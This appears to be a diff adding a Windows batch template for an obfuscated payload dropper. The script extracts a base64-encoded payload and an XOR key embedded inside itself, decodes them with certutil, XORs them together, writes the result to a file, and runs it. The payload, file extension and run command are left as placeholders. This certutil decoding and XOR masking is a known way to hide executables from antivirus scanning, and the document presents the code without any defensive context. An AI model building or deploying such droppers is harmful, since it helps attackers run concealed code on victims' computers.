@@ -1,0 +1,168 @@
+@echo off
+SETLOCAL EnableDelayedExpansion
+
+if not defined trace set trace=rem
+%trace% on
+
+goto:myCustomText
+__CONTENT__
+:myCustomText
+
+goto:myCustomText2
+__XOR__
+:myCustomText2
+
+call :catMyChunk myCustomText %~n0_c1.tmp
+call :catMyChunk myCustomText2 %~n0_t1.tmp
+
+certutil -decode -f %~n0_c1.tmp %~n0_c2.tmp
+certutil -encodehex -f %~n0_c2.tmp %~n0_c3.tmp 4
+
+certutil -decode -f %~n0_t1.tmp %~n0_t2.tmp
+certutil -encodehex -f %~n0_t2.tmp %~n0_t3.tmp 4
+
+
+FOR /L %%I IN (0,1,255) Do (
+  call :DOHex2 %%I
+  set hexa[%%I]=!RET!
+)
+
+del %~n0_c4.tmp
+for /f %%N in ('type "%~n0_c3.tmp"^|find /c /v ""') do set "cnt=%%N"
+>"%~n0_c4.tmp" 9<"%~n0_c3.tmp" <"%~n0_t3.tmp" (
+  for /l %%N in (1 1 %cnt%) do (
+    set "ln1="
+    set "ln2="
+    <&9 set /p "ln1="
+    set /p "ln2="
+
+    set n=0
+    FOR %%a in (!ln1!) do (
+      set vector1[!n!]=%%a
+      set /A n+=1
+    )
+    set n=0
+    set r=
+    FOR %%a in (!ln2!) do (
+      set vector2[!n!]=%%a
+      set /A n+=1
+    )
+    SET R=
+    set /A n=n-1
+    FOR /L %%I IN (0,1,!n!) Do (
+      CALL SET h1=0x!vector1[%%I]!
+      CALL SET h2=0x!vector2[%%I]!
+      SET /A XorResult = h1 ^^ h2
+      for %%n in (!XorResult!) do SET RET=!hexa[%%n]!
+      SET R=!R! !RET!
+    )
+    echo !R!
+  )
+)
+certutil -decodehex -F %~n0_c4.tmp %~n0.__EXTENSION__
+
+__COMMAND__ %~n0.__EXTENSION__
+
+goto end:
+
+
+
+
+
+
+:DoBin
+    Set MinInBase=2
+    Set ShiftBy=1
+    Set StartSyn=0b
+    call :DoCalc %1
+goto :eof
+
+:DoHex
+    Set MinInBase=16
+    Set ShiftBy=4
+    Set StartSyn=0x
+    call :DoCalc %1
+goto :eof
+
+:DoHex2
+    Set MinInBase=16
+    Set ShiftBy=4
+    Set StartSyn=
+    call :DoCalc %1
+goto :eof
+
+:DoDec
+    if {%1} EQU {} goto :eof
+    set  /a BinStr=%1
+    set RET=%BinStr%
+    rem echo %RET%
+goto :eof
+
+
+:DoCalc
+    Set BinStr=
+    SET /A A=%1
+    %Trace% %A%
+:StartSplit
+    SET /A B="A>>%ShiftBy%"
+    %Trace% %B%
+    SET /A C="B<<%ShiftBy%"
+    %Trace% %C%
+    SET /A C=A-C
+    %Trace% %C%
+    call :StringIt %C%
+    If %B% LSS %MinInBase% goto :EndSplit
+    set A=%B%
+goto :StartSplit
+:EndSplit
+    call :StringIt %B%
+    set RET=%StartSyn%%BinStr%
+    rem Echo %RET%
+EndLocal & set RET=%RET%
+goto :eof
+
+
+:StringIt
+    set Bin=0123456789ABCDEF
+    FOR /F "tokens=*" %%A in ('echo "%%BIN:~%1,1%%"') do set RET=%%A
+    set ret=%ret:"=%
+    Set BinStr=%Ret%%BinStr%
+goto :eof
+
+:catMyChunk
+::Should call this function with 2 args, MYDELIM and outFile.txt
+::where is to be catted to outFile.txt
+::and text starts with <beginning of line>goto:MYDELIM
+::and ends with <beginning of line>:MYDELIM
+set searchStart=goto:%~1
+set searchStop=:%~1
+set outFile=%~2
+if exist %outFile% del %outFile%
+findstr /n ^^ "%~f0" > pipeline.txt
+call :seekMyChunk < pipeline.txt
+del pipeline.txt
+exit /B
+
+:seekMyChunk
+set oneLine=:EOF
+set /P oneLine=
+if !oneLine! == :EOF goto startNotFound
+set oneLine=!oneLine:*:=!
+if not !oneLine! == %searchStart% goto seekMyChunk
+:catNextLine
+set oneLine=:EOF
+set /P oneLine=
+if !oneLine! == :EOF goto stopNotFound
+set oneLine=!oneLine:*:=!
+if !oneLine! == %searchStop% goto :eof
+echo/!oneLine!>> %outFile%
+goto catNextLine
+:startNotFound
+echo Error finding start delimiter for %searchStart% in catMyChunk
+goto :eof
+:stopNotFound
+echo Error finding stop delimiter for %searchStop% in catMyChunk
+goto :eof
+
+
+:end
